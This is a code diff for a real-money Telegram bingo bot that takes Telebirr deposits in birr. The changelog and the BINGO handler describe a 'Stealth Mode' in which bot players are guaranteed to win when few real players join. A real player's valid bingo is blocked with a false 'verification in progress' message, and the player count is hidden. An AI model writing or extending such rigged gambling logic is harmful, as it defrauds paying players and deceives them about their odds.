@@ -1,9 +1,4 @@
 # Addis (አዲስ) Bingo Bot - V32: Game Reliability & Win Guarantee
-# Changes:
-# 1. Game Length Fix (Stealth Mode): Reworked sequence generation to ensure a full 75-number game,
-#    guaranteeing the bot wins within the first ~30 calls, preventing premature game end/stall.
-# 2. Prominent Announcement: Enhanced the "No Winner" message for better visibility.
-# 3. TTS Error: Added note on GEMINI_API_KEY environment issue.
 
 import os
 import logging
@@ -14,7 +9,7 @@ import random
 import time
 import uuid 
 import io      
-import struct   
+import struct  
 
 # Try importing requests for TTS
 try:
@@ -40,14 +35,16 @@ GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')
 TELEBIRR_ACCOUNT = "0927922721"
 
 # --- Financial Constraints ---
-CARD_COST = 20.00        # One game price
-MIN_DEPOSIT = 50.00      # Minimum deposit enforced in messaging
-MIN_WITHDRAW = 100.00    # Minimum for withdrawing, enforced in code
+CARD_COST = 20.00      # One game price
+MIN_DEPOSIT = 50.00    # Minimum deposit enforced in messaging
+MIN_WITHDRAW = 100.00  # Minimum for withdrawing, enforced in code
 
 REFERRAL_BONUS = 10.00
 
 # Conversation States
 GET_CARD_NUMBER, GET_WITHDRAW_AMOUNT, GET_TELEBIRR_ACCOUNT, GET_DEPOSIT_CONFIRMATION = range(4)
+# Renaming GET_CARD_NUMBER to be used as GET_DEPOSIT_AMOUNT for clarity in the flow,
+# but keeping the variable name for consistency with user's original constants.
 
 # Admin ID Extraction
 ADMIN_USER_ID = None
@@ -70,8 +67,8 @@ BOT_WIN_DELAY_CALLS = random.randint(1, 3)
 COLUMNS = ['B', 'I', 'N', 'G', 'O']
 
 # Payout Logic
-GLOBAL_CUT_PERCENT = 0.20       
-WINNER_SHARE_PERCENT = 0.80     
+GLOBAL_CUT_PERCENT = 0.20      
+WINNER_SHARE_PERCENT = 0.80    
 
 # TTS URL
 TTS_URL = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-tts:generateContent?key={GEMINI_API_KEY}"
@@ -79,8 +76,8 @@ TTS_URL = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-f
 # --- UI Aesthetics ---
 EMOJI_UNMARKED_UNCALLED = '🔴' 
 EMOJI_CALLED_UNMARKED = '🟢'   
-EMOJI_MARKED = '✅'           
-EMOJI_FREE = '🌟'     
+EMOJI_MARKED = '✅'         
+EMOJI_FREE = '🌟'      
 EMOJI_CARD = '🃏'
 EMOJI_BINGO = '🏆'
 EMOJI_CALL = '📢'
@@ -302,18 +299,18 @@ def create_wav_bytes(pcm_data: bytes, sample_rate: int = 24000) -> io.BytesIO:
     
     # fmt chunk
     buffer.write(b'fmt ')
-    buffer.write(struct.pack('<I', 16))                  # Chunk size
-    buffer.write(struct.pack('<H', 1))                   # Audio format (1 = PCM)
-    buffer.write(struct.pack('<H', num_channels))        # Number of channels
-    buffer.write(struct.pack('<I', sample_rate))         # Sample rate
+    buffer.write(struct.pack('<I', 16))          # Chunk size
+    buffer.write(struct.pack('<H', 1))           # Audio format (1 = PCM)
+    buffer.write(struct.pack('<H', num_channels))  # Number of channels
+    buffer.write(struct.pack('<I', sample_rate))  # Sample rate
     buffer.write(struct.pack('<I', sample_rate * num_channels * bits_per_sample // 8)) # Byte rate
     buffer.write(struct.pack('<H', num_channels * bits_per_sample // 8)) # Block align
-    buffer.write(struct.pack('<H', bits_per_sample))     # Bits per sample
+    buffer.write(struct.pack('<H', bits_per_sample))  # Bits per sample
     
     # data chunk
     buffer.write(b'data')
-    buffer.write(struct.pack('<I', data_size))           # Data size
-    buffer.write(pcm_data)                               # PCM data
+    buffer.write(struct.pack('<I', data_size))   # Data size
+    buffer.write(pcm_data)                       # PCM data
     
     buffer.seek(0)
     return buffer
@@ -509,8 +506,8 @@ async def run_game_loop(context, game_id, real_pids, bot_players):
     
     # Referral Bonus Check
     for pid in real_pids:
-        # Note: pay_referrer_bonus is a sync function accessing Firestore
-        pay_referrer_bonus(pid) 
+        # Note: pay_referrer_bonus is a sync function accessing Firestore, using asyncio.to_thread
+        await asyncio.to_thread(pay_referrer_bonus, pid)
         
     all_possible_nums = list(range(1, 76))
     
@@ -668,7 +665,8 @@ async def finalize_win(context, game_id, winner_id, is_bot=False):
     
     # 1. Update stats for all real players
     for pid in g['players']:
-        update_game_stats(pid, is_win= (pid == winner_id and not is_bot) )
+        # update_game_stats is sync, wrapping it
+        await asyncio.to_thread(update_game_stats, pid, is_win= (pid == winner_id and not is_bot) )
         
     if winner_id is None:
         # V32 IMPROVEMENT: Prominent "No Winner" message
@@ -689,14 +687,14 @@ async def finalize_win(context, game_id, winner_id, is_bot=False):
         data = await get_user_data(winner_id) # Use await
         w_name = f"{data.get('first_name')} (ID: {winner_id})"
         # Update balance and log transaction (Balance integrity maintained)
-        update_balance(winner_id, prize, transaction_type='Win', description=f"Bingo prize for game {game_id}")
+        await asyncio.to_thread(update_balance, winner_id, prize, transaction_type='Win', description=f"Bingo prize for game {game_id}")
         
         # V31: Make announcement more visible
         msg = (f"🌟🏆 **BIG BINGO WINNER!!!** 🏆🌟\n\n"
                f"🥳 **እውነተኛ አሸናፊ (REAL WINNER):** **{w_name}**\n"
                f"💰 **ትልቅ ሽልማት (GRAND PRIZE):** **{prize:.2f} ብር** (ወደ ሒሳብዎ ገብቷል)\n\n"
                f"ጨዋታው ተጠናቋል። **አዲሱን ጨዋታ ለመጀመር /play ይጫኑ!**")
-           
+            
     # 3. Clean up display and send final message
     for pid in g['players']:
         # Delete Board Message 
@@ -770,366 +768,226 @@ async def ap_dep(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     try:
         target_id = int(context.args[0])
         amount = float(context.args[1])
+        
         # Use update_balance with transaction logging (Atomic update)
-        update_balance(target_id, amount, transaction_type='Admin Deposit', description=f"Admin top-up by {update.effective_user.id}")
-        await update.message.reply_text(f"✅ ለተጠቃሚ ID {target_id}፣ {amount:.2f} ብር ተጨምሯል።")
+        await asyncio.to_thread(update_balance, target_id, amount, transaction_type='Admin Deposit', description=f"Admin top-up by {update.effective_user.id}")
+        
+        # Notify the admin
+        target_data = await get_user_data(target_id)
+        target_name = target_data.get('first_name', f"User {target_id}")
+        
+        await update.message.reply_text(
+            f"✅ **ስኬት!**\n"
+            f"👤 ለተጠቃሚ {target_name} ({target_id}): **{amount:.2f} ብር** ተጨምሯል።",
+            parse_mode='Markdown'
+        )
     except ValueError:
-        await update.message.reply_text("❌ ትክክለኛ ID እና መጠን ያስገቡ።")
-
-async def ap_bal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Admin command to check their own bot balance."""
-    if update.effective_user.id != ADMIN_USER_ID:
-        await update.message.reply_text("⛔ ይህ ትዕዛዝ ለአስተዳዳሪዎች ብቻ ነው።")
-        return
-    
+        await update.message.reply_text("⛔ የመጠን ወይም የተጠቃሚ መታወቂያ ትክክለኛ ቅርጸት አይደለም።")
+    except Exception as e:
+        logger.error(f"Admin deposit error: {e}")
+        await update.message.reply_text(f"⛔ ያልተጠበቀ ስህተት ተፈጥሯል: {e}")
+        
+async def enter_lobby(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
-    bal = (await get_user_data(user_id)).get('balance', 0.00) # Use await for correctness
-    msg = f"🛡️ **የአስተዳዳሪ ቀሪ ሒሳብ (/ap_bal):**\n\n**{bal:.2f} ብር**"
+    user_data = await get_user_data(user_id)
+    balance = user_data.get('balance', 0.00)
+
+    if ACTIVE_GAMES:
+        await update.message.reply_text("⚠️ **አሁን የሚካሄድ ጨዋታ አለ።** ጨዋታው እስኪያልቅ ድረስ መሳተፍ አይችሉም።")
+        return
+
+    if balance < CARD_COST:
+        await update.message.reply_text(f"❌ ለመጫወት በቂ ሒሳብ የለዎትም። የካርድ ዋጋ **{CARD_COST:.2f} ብር** ነው። እባክዎ /deposit ይጠቀሙ።")
+        return
+
+    if user_id in PENDING_PLAYERS:
+        await update.message.reply_text("⚠️ **ቀድሞውንም ተመዝግበዋል።** ጨዋታው እስኪጀመር ይጠብቁ።")
+        return
+
+    # Check for available card number
+    used_cards = list(PENDING_PLAYERS.values())
+    pool = [c for c in range(1, MAX_PRESET_CARDS + 1) if c not in used_cards]
+
+    if not pool:
+        await update.message.reply_text("❌ ይቅርታ፣ ሁሉም ካርዶች ጥቅም ላይ ውለዋል። እባክዎ በኋላ ይሞክሩ።")
+        return
+
+    card_number = random.choice(pool)
+    PENDING_PLAYERS[user_id] = card_number
+    
+    # Deduct cost and log transaction
+    await asyncio.to_thread(update_balance, user_id, -CARD_COST, transaction_type='Card Purchase', description=f"Purchase card #{card_number}")
+    
+    remaining_balance = balance - CARD_COST
+    
+    msg = (f"✅ **Card #{card_number} ተገዝቷል!**\n"
+           f"💳 **ዋጋ:** {CARD_COST:.2f} ብር\n"
+           f"💰 **የቀረ ሒሳብ:** {remaining_balance:.2f} ብር\n\n"
+           f"👥 **ተጫዋቾች:** {len(PENDING_PLAYERS)}\n\n"
+           f"ጨዋታው በቅርቡ ይጀምራል። እባክዎ ይጠብቁ።")
+           
+    # Update lobby message or send a new one
+    if not LOBBY_STATE['is_running']:
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 ጨዋታውን አሁን ጀምር", callback_data="START_GAME")]])
+        
+        try:
+            if LOBBY_STATE['msg_id'] and LOBBY_STATE['chat_id']:
+                await context.bot.edit_message_text(
+                    chat_id=LOBBY_STATE['chat_id'],
+                    message_id=LOBBY_STATE['msg_id'],
+                    text=msg,
+                    reply_markup=kb,
+                    parse_mode='Markdown'
+                )
+            else:
+                lobby_msg = await update.message.reply_text(msg, reply_markup=kb, parse_mode='Markdown')
+                LOBBY_STATE['is_running'] = True
+                LOBBY_STATE['msg_id'] = lobby_msg.message_id
+                LOBBY_STATE['chat_id'] = update.effective_chat.id
+        except:
+            # Fallback if editing fails
+            lobby_msg = await update.message.reply_text(msg, reply_markup=kb, parse_mode='Markdown')
+            LOBBY_STATE['is_running'] = True
+            LOBBY_STATE['msg_id'] = lobby_msg.message_id
+            LOBBY_STATE['chat_id'] = update.effective_chat.id
+    
+    # If a player buys a card and the game is already in lobby, just update the player
     await update.message.reply_text(msg, parse_mode='Markdown')
 
-async def ap_bal_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Admin command to check another player's balance."""
-    if update.effective_user.id != ADMIN_USER_ID:
-        await update.message.reply_text("⛔ ይህ ትዕዛዝ ለአስተዳዳሪዎች ብቻ ነው።")
-        return
-    
-    if len(context.args) != 1:
-        await update.message.reply_text("አጠቃቀም: /ap_bal_check [የተጠቃሚ_ID]")
-        return
-        
-    try:
-        target_id = int(context.args[0])
-        user_data = await get_user_data(target_id) # Use await for correctness
-        
-        if 'first_name' not in user_data:
-            await update.message.reply_text(f"❌ የተጠቃሚ ID {target_id} አልተገኘም።")
-            return
-
-        name = user_data.get('first_name', 'Unnamed User')
-        bal = user_data.get('balance', 0.00)
-        
-        msg = (f"🔍 **የተጠቃሚ ሒሳብ ፍተሻ**\n\n"
-               f"👤 ስም: **{name}**\n"
-               f"ID: `{target_id}`\n"
-               f"💳 ቀሪ ሒሳብ: **{bal:.2f} ብር**")
-        await update.message.reply_text(msg, parse_mode='Markdown')
-    except ValueError:
-        await update.message.reply_text("❌ ትክክለኛ ID ያስገቡ።")
-
-# --- CONVERSATION HANDLER FOR /PLAY ---
-
-async def play_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    user_id = update.effective_user.id
-    if user_id in PENDING_PLAYERS: 
-        await update.message.reply_text("አስቀድመው በጨዋታ ለመግባት እየጠበቁ ነው!")
-        return ConversationHandler.END
-    
-    bal = (await get_user_data(user_id)).get('balance', 0.00) # Use await
-    if bal < CARD_COST:
-        await update.message.reply_text(f"⛔ በቂ ቀሪ ሒሳብ የለዎትም። ለመጫወት {CARD_COST:.2f} ብር ያስፈልጋል። የአሁኑ ቀሪ ሒሳብዎ: {bal:.2f} ብር።\n\n/deposit የሚለውን ይጠቀሙ።", parse_mode='Markdown')
-        return ConversationHandler.END
-
-    # Ask for card number input (1-200)
-    await update.message.reply_text(f"💳 **የቢንጎ ካርድ ቁጥርዎን ይምረጡ**\n(ከ 1 እስከ {MAX_PRESET_CARDS} ባለው ክልል ውስጥ ቁጥር ያስገቡ):\n\n**ሰርዝ:** ሂደቱን ለማቋረጥ /cancel ይጠቀሙ።", parse_mode='Markdown')
-    return GET_CARD_NUMBER
-
-async def handle_card_selection(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    user_id = update.effective_user.id
-    
-    try:
-        card_num = int(update.message.text.strip())
-        if not (1 <= card_num <= MAX_PRESET_CARDS):
-            await update.message.reply_text(f"❌ እባክዎ ከ 1 እስከ {MAX_PRESET_CARDS} ባለው ክልል ውስጥ ትክክለኛ ቁጥር ያስገቡ።")
-            return GET_CARD_NUMBER # Stay in conversation
-        
-        # Re-check balance before final deduction (Security)
-        current_bal = (await get_user_data(user_id)).get('balance', 0.00) # Use await
-        if current_bal < CARD_COST:
-            await update.message.reply_text("⛔ በቂ ቀሪ ሒሳብ የለዎትም። እባክዎ እንደገና ይሞክሩ።")
-            return ConversationHandler.END
-            
-        # Deduct balance and join lobby (Balance integrity maintained)
-        update_balance(user_id, -CARD_COST, transaction_type='Card Purchase', description=f"Card #{card_num} purchase")
-        PENDING_PLAYERS[user_id] = card_num
-        
-        await update.message.reply_text(f"✅ ካርድ ቁጥር **#{card_num}** መርጠዋል። ሌሎች ተጫዋቾችን በመጠበቅ ላይ ነን...")
-        
-        # Start Countdown if first player
-        if len(PENDING_PLAYERS) == 1:
-            chat_id = update.message.chat.id
-            # Send new message for lobby updates (Updated to 10 seconds)
-            lobby_msg = await context.bot.send_message(chat_id, "⏳ **የቢንጎ ሎቢ ተከፍቷል!** ጨዋታው በ **10 ሰከንድ** ውስጥ ይጀምራል።", parse_mode='Markdown')
-            asyncio.create_task(lobby_countdown(context, chat_id, lobby_msg.message_id))
-            
-    except ValueError:
-        await update.message.reply_text("❌ ትክክለኛ ቁጥር አላስገቡም። በድጋሚ ይሞክሩ:")
-        return GET_CARD_NUMBER # Stay in conversation
-        
-    return ConversationHandler.END # End conversation on success
-
-async def cancel_play(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Cancels the card selection process."""
-    await update.message.reply_text("የካርድ መምረጥ ሂደት ተሰርዟል።")
-    return ConversationHandler.END
-
-# --- /quickplay ---
 async def quickplay_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handles the /quickplay command by selecting a random card number."""
+    # Quickplay just calls enter_lobby as the logic is the same
+    await enter_lobby(update, context)
+    
+async def refer_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
-    if user_id in PENDING_PLAYERS: 
-        await update.message.reply_text("አስቀድመው በጨዋታ ለመግባት እየጠበቁ ነው!")
-        return
+    referral_link = f"https://t.me/{context.bot.username}?start={user_id}"
     
-    bal = (await get_user_data(user_id)).get('balance', 0.00) # Use await
-    if bal < CARD_COST:
-        await update.message.reply_text(f"⛔ በቂ ቀሪ ሒሳብ የለዎትም። ለመጫወት {CARD_COST:.2f} ብር ያስፈልጋል። የአሁኑ ቀሪ ሒሳብዎ: {bal:.2f} ብር።\n\n/deposit የሚለውን ይጠቀሙ።", parse_mode='Markdown')
-        return
+    msg = (f"🔗 **ጓደኞችዎን ይጋብዙና ገንዘብ ያግኙ!**\n\n"
+           f"ይህንን ማገናኛ በመጠቀም ጓደኛዎ ሲመዘገብ እና የመጀመሪያውን ጨዋታ ሲጫወት፣ እርስዎ **{REFERRAL_BONUS:.2f} ብር** ጉርሻ ያገኛሉ!\n\n"
+           f"**የእርስዎ መጋበዣ ማገናኛ (Referral Link):**\n`{referral_link}`\n\n"
+           f"ይላኩትና መሸለም ይጀምሩ!")
+           
+    await update.message.reply_text(msg, parse_mode='Markdown')
 
-    # Select random card number
-    card_num = random.randint(1, MAX_PRESET_CARDS)
-    
-    # Deduct balance and join lobby
-    update_balance(user_id, -CARD_COST, transaction_type='Card Purchase', description=f"Card #{card_num} purchase")
-    PENDING_PLAYERS[user_id] = card_num
-    
-    await update.message.reply_text(f"✅ በፈጣን ጨዋታ፣ ካርድ ቁጥር **#{card_num}** መርጠዋል። ሌሎች ተጫዋቾችን በመጠበቅ ላይ ነን...")
-    
-    # Start Countdown if first player
-    if len(PENDING_PLAYERS) == 1:
-        chat_id = update.message.chat.id
-        # Send new message for lobby updates (Updated to 10 seconds)
-        lobby_msg = await context.bot.send_message(chat_id, "⏳ **የቢንጎ ሎቢ ተከፍቷል!** ጨዋታው በ **10 ሰከንድ** ውስጥ ይጀምራል።", parse_mode='Markdown')
-        asyncio.create_task(lobby_countdown(context, chat_id, lobby_msg.message_id))
 
-async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    q = update.callback_query
-    uid = q.from_user.id
-    
-    data = q.data.split('|')
-    act = data[0]
+# --- Deposit Conversation Flow ---
 
-    if act == "MARK":
-        # MARK|gid|mid|cnum|c|r (mid is the card message ID)
-        gid, mid, cnum, c, r = data[1], int(data[2]), int(data[3]), int(data[4]), int(data[5])
-        if gid not in ACTIVE_GAMES: 
-            try: await q.answer("ጨዋታው አስቀድሞ አብቅቷል።"); return
-            except: return
-        
-        g = ACTIVE_GAMES[gid]
-        card = g['player_cards'].get(uid)
-        if not card or card['number'] != cnum: return
-        
-        val = get_card_value(card, int(c), int(r))
-        c_pos = (int(c), int(r))
-        
-        if val != "FREE" and not card['called'].get(c_pos):
-            await q.answer("❌ የተጠሩ (🟢 አረንጓዴ የሆኑ) ቁጥሮችን ብቻ ምልክት ያድርጉ።")
-            return
+async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    msg = (f"**💰 ገንዘብ ለማስገባት (Deposit)**\n\n"
+           f"እባክዎ ማስገባት የሚፈልጉትን **መጠን በብር** ያስገቡ።\n"
+           f"**ማስታወሻ:** ዝቅተኛው ማስገቢያ **{MIN_DEPOSIT:.2f} ብር** ነው።")
+    await update.message.reply_text(msg, parse_mode='Markdown')
+    return GET_CARD_NUMBER # Using GET_CARD_NUMBER state for amount input
+
+async def get_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    try:
+        amount = float(update.message.text.strip())
+        if amount < MIN_DEPOSIT:
+            await update.message.reply_text(f"❌ ማስገባት የሚቻለው **ቢያንስ {MIN_DEPOSIT:.2f} ብር** ነው። ትክክለኛውን መጠን ያስገቡ።")
+            return GET_CARD_NUMBER
             
-        card['marked'][c_pos] = not card['marked'].get(c_pos)
+        # Store amount in conversation context
+        context.user_data['deposit_amount'] = amount
         
-        kb = build_card_keyboard(card, gid, mid)
-        try: await context.bot.edit_message_reply_markup(chat_id=uid, message_id=mid, reply_markup=kb)
-        except Exception as e: logger.warning(f"Failed to edit card: {e}")
-
-    elif act == "BINGO":
-        gid, mid = data[1], int(data[2])
-        if gid not in ACTIVE_GAMES: 
-            await q.answer("ጨዋታው አስቀድሞ አብቅቷል።")
-            return
-        g = ACTIVE_GAMES[gid]
-        card = g['player_cards'].get(uid)
+        msg = (f"✅ **የማስገቢያ ጥያቄ:**\n"
+               f"**መጠን:** {amount:.2f} ብር\n"
+               f"**የመክፈያ ዘዴ:** Telebirr\n\n"
+               f"እባክዎ **{amount:.2f} ብር** ወደ **Telebirr ቁጥር: `{TELEBIRR_ACCOUNT}`** ይላኩና ክፍያውን የሚያረጋግጥ **የክፍያ ኮድ (Transaction ID)** በዚሁ መልስ ይላኩልኝ።\n"
+               f"ከላኩ በኋላ **'ክፍያ ተፈጸመ'** የሚለውን ቁልፍ ይጫኑ።")
         
-        # Check if the game requires a bot win (Stealth Mode)
-        is_stealth_game = len(g['players']) < MIN_REAL_PLAYERS_FOR_ORGANIC_GAME and g.get('winning_bot_id')
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton("ክፍያ ተፈጸመ", callback_data="CONFIRM_DEPOSIT")]])
+        await update.message.reply_text(msg, reply_markup=kb, parse_mode='Markdown')
         
-        # 1. Check if the player actually has Bingo
-        if check_win(card):
-            if is_stealth_game:
-                # ENFORCEMENT: When 4 or less players, computer MUST win.
-                # Block the real player's attempt and tell them to wait (maintains the illusion)
-                await q.answer("❌ **ጥሪዎ ትክክል ቢሆንም፣** የማረጋገጫ ሂደት እየተካሄደ ነው። እባክዎ በሚቀጥሉት ጥቂት ሰከንዶች ውስጥ ይጠብቁ።")
-                # The game loop will continue, and the bot's guaranteed win will occur shortly.
-            else:
-                # Organic Game (5+ players): Real player wins immediately.
-                await finalize_win(context, gid, uid, False)
-        else:
-            await q.answer("❌ የተሳሳተ ቢንጎ! ሁሉንም 5 አስፈላጊ ካሬዎች ምልክት ማድረጉን ያረጋግጡ።")
-            
-    elif act == "START_DEPOSIT_FLOW":
-        # V30: This initiates the conversation to receive the receipt (file/photo/text)
-        await q.answer("እባክዎ ደረሰኙን (ፎቶ/ሰነድ) ወይም የማረጋገጫ መልእክቱን ይላኩ።")
-        # Return the state to enter the ConversationHandler
-        return GET_DEPOSIT_CONFIRMATION
-
-
-async def lobby_countdown(ctx, chat_id, msg_id):
-    """Handles the 10-second countdown timer in the lobby message."""
-    global LOBBY_STATE
-    LOBBY_STATE = {'is_running': True, 'msg_id': msg_id, 'chat_id': chat_id}
-    
-    # Changed countdown from 5 to 10 seconds. Removed player count for stealth.
-    for i in range(10, 0, -1): 
-        if not LOBBY_STATE['is_running']: return
-        try: 
-            # Stealth message: only shows countdown
-            msg_text = f"⏳ **የቢንጎ ሎቢ ተከፍቷል!** ጨዋታው በ **{i} ሰከንድ** ውስጥ ይጀምራል።" 
-            await ctx.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=msg_text, parse_mode='Markdown')
-        except: pass
-        await asyncio.sleep(1)
+        return GET_DEPOSIT_CONFIRMATION # Wait for confirmation message or button press
         
-    await start_new_game(ctx)
+    except ValueError:
+        await update.message.reply_text("❌ ትክክለኛ የብር መጠን አላስገቡም። እባክዎ እንደ '50.00' ያለ ቁጥር ያስገቡ።")
+        return GET_CARD_NUMBER
 
-# --- DEPOSIT, WITHDRAW, REFER ---
-
-async def deposit_command_initial(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Sends the deposit instructions with copiable data and a button to proceed."""
-    user_id = update.effective_user.id
+async def get_deposit_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    query = update.callback_query
     
-    # Use code blocks for easy copying
-    telebirr_text = f"**ቴሌብር አካውንት ቁጥር (ይቅዱ):**\n`{TELEBIRR_ACCOUNT}`"
-    user_id_text = f"**የእርስዎ መታወቂያ (ይቅዱ):**\n`{user_id}`" 
-
-    keyboard = [[InlineKeyboardButton("✅ ገንዘብ አስገብቼ የማረጋገጫ መልእክት/ደረሰኝ ልኬያለሁ", callback_data="START_DEPOSIT_FLOW")]]
+    if query and query.data == "CONFIRM_DEPOSIT":
+        # Request the transaction ID after button press
+        await query.answer()
+        await context.bot.send_message(
+            chat_id=query.message.chat_id,
+            text="🙏 **ክፍያውን የሚያረጋግጥ የግብይት መታወቂያ (Transaction ID) ወይም የክፍያ ማረጋገጫ መልዕክት ይላኩልኝ።**"
+        )
+        return GET_DEPOSIT_CONFIRMATION # Stay in this state, waiting for the ID
     
-    msg = (
-        f"🏦 **ገንዘብ ለማስገባት (/deposit)**\n\n"
-        f"1. **አስፈላጊ መረጃዎች:**\n"
-        f"{telebirr_text}\n"
-        f"{user_id_text}\n\n"
-        f"2. ገንዘቡን ወደ ላይ በተጠቀሰው ቁጥር ይላኩ። የሚላከው ዝቅተኛ መጠን **{MIN_DEPOSIT:.2f} ብር** ነው።\n\n"
-        f"**🚨 ቀጣይ እርምጃ 🚨**\n"
-        f"ገንዘቡን ከላኩ በኋላ፣ እባክዎ ከታች ያለውን ቁልፍ በመጫን **የላኩበትን ደረሰኝ (ፎቶ ወይም ሰነድ)** ይላኩልኝ።\n\n"
-        f"**ሰርዝ:** ሂደቱን ለማቋረጥ /cancel ይጠቀሙ።"
-    )
-    
-    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-    # Return a state to re-enter the ConversationHandler flow via callback
-    return GET_DEPOSIT_CONFIRMATION
-
-async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """V30: Handles the user's receipt (photo, document, or text) and notifies the admin."""
-    user_id = update.effective_user.id
-    username = update.effective_user.username or update.effective_user.first_name
-    
-    if not ADMIN_USER_ID:
-        await update.message.reply_text("❌ የአስተዳዳሪ ID አልተዋቀረም፣ የማረጋገጫ ሂደቱ ሊጠናቀቅ አይችልም። እባክዎ ቆይተው ይሞክሩ።")
+    # Handle the incoming message which should be the transaction ID
+    if update.message and update.message.text:
+        tx_id = update.message.text.strip()
+        amount = context.user_data.get('deposit_amount')
+        user_id = update.effective_user.id
+        
+        # Admin Notification (Simulated Manual Confirmation)
+        admin_msg = (f"🚨 **አዲስ የማስገቢያ ጥያቄ**\n"
+                     f"**ተጠቃሚ ID:** {user_id}\n"
+                     f"**መጠን:** {amount:.2f} ብር\n"
+                     f"**የግብይት ID:** {tx_id}\n\n"
+                     f"እባክዎ ክፍያውን ያረጋግጡና **{user_id}** ን በመጠቀም ገንዘቡን ይጨምሩ።\n"
+                     f"አጠቃቀም: `/ap_dep {user_id} {amount:.2f}`")
+        
+        if ADMIN_USER_ID:
+            await context.bot.send_message(ADMIN_USER_ID, admin_msg, parse_mode='Markdown')
+        
+        # User confirmation
+        await update.message.reply_text(
+            "⏳ **አመሰግናለሁ!** የክፍያ መታወቂያው ደርሶናል። አስተዳዳሪው ክፍያዎን አረጋግጦ ሒሳብዎን በቅርቡ ይጨምራል። በትዕግስት ይጠብቁ።",
+            parse_mode='Markdown'
+        )
+        
+        # Clean up conversation state
+        context.user_data.pop('deposit_amount', None)
         return ConversationHandler.END
-    
-    admin_notification_base = (
-        f"**🚨 አዲስ የተቀማጭ ገንዘብ ጥያቄ (Deposit Request) 🚨**\n\n"
-        f"👤 የተጠቃሚ ስም: @{username}\n"
-        f"ID: `{user_id}`\n\n"
-    )
-
-    # 1. Handle Photo Receipt
-    if update.message.photo:
-        photo_file_id = update.message.photo[-1].file_id # Get the highest resolution photo
-        caption = admin_notification_base + (
-            "✅ **የተላከ ደረሰኝ: ፎቶ**\n"
-            "**እርምጃ:** ሒሳብዎን አረጋግጠው በሚከተለው ትዕዛዝ ገንዘቡን ይጨምሩ:\n"
-            f"`/ap_dep {user_id} [መጠን]`"
-        )
-        try:
-            await context.bot.send_photo(ADMIN_USER_ID, photo_file_id, caption=caption, parse_mode='Markdown')
-        except Exception as e:
-            logger.error(f"Failed to send photo receipt to admin: {e}")
-            
-    # 2. Handle Document Receipt
-    elif update.message.document:
-        document_file_id = update.message.document.file_id
-        caption = admin_notification_base + (
-            "✅ **የተላከ ደረሰኝ: ሰነድ/ፋይል**\n"
-            "**እርምጃ:** ሒሳብዎን አረጋግጠው በሚከተለው ትዕዛዝ ገንዘቡን ይጨምሩ:\n"
-            f"`/ap_dep {user_id} [መጠን]`"
-        )
-        try:
-            await context.bot.send_document(ADMIN_USER_ID, document_file_id, caption=caption, parse_mode='Markdown')
-        except Exception as e:
-            logger.error(f"Failed to send document receipt to admin: {e}")
-
-    # 3. Handle Text Confirmation (Fallback)
-    elif update.message.text:
-        confirmation_text = update.message.text
-        admin_notification = admin_notification_base + (
-            f"📬 የማረጋገጫ መልእክት:\n"
-            f"```\n{confirmation_text}\n```\n\n"
-            f"**እርምጃ:** ሒሳብዎን አረጋግጠው በሚከተለው ትዕዛዝ ገንዘቡን ይጨምሩ:\n"
-            f"`/ap_dep {user_id} [መጠን]`"
-        )
-        try:
-            await context.bot.send_message(ADMIN_USER_ID, admin_notification, parse_mode='Markdown')
-        except Exception as e:
-            logger.error(f"Failed to send text confirmation to admin: {e}")
-            
-    else:
-        # User sent an unsupported message type
-        await update.message.reply_text("❌ እባክዎ የቴሌብር ደረሰኝ ፎቶ፣ ሰነድ ወይም የማረጋገጫ መልእክት ብቻ ይላኩ።")
-        return GET_DEPOSIT_CONFIRMATION # Stay in conversation until supported input is received
-    
-    # Send confirmation to user
-    user_confirmation = (
-        "✅ **የማረጋገጫ መልእክት/ደረሰኝዎ ተልኳል!**\n\n"
-        "አስተዳዳሪው ደረሰኝዎን እየተመለከተ ነው። በቅርቡ ሒሳብዎ ላይ ገቢ ይደረጋል።\n\n"
-        "**ሒሳብዎን ለመፈተሽ:** /balance"
-    )
-    await update.message.reply_text(user_confirmation, parse_mode='Markdown')
         
+    # If something unexpected happens, cancel
+    await update.message.reply_text("⛔ ያልተጠበቀ ስህተት ተፈጥሯል። እባክዎ እንደገና ይሞክሩ። /deposit")
     return ConversationHandler.END
 
-async def cancel_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Cancels the deposit process."""
-    await update.message.reply_text("የማስገቢያው ሂደት ተሰርዟል።")
-    return ConversationHandler.END
+
+# --- Withdraw Conversation Flow ---
 
 async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     user_id = update.effective_user.id
-    bal = (await get_user_data(user_id)).get('balance', 0.00) # Use await for correctness
+    user_data = await get_user_data(user_id)
+    balance = user_data.get('balance', 0.00)
     
-    context.user_data['balance'] = bal
-    
-    if bal < MIN_WITHDRAW:
-        msg = (
-            f"❌ **ገንዘብ ማውጣት አልተቻለም**\n"
-            f"የእርስዎ ወቅታዊ ቀሪ ሒሳብ: **{bal:.2f} ብር**\n"
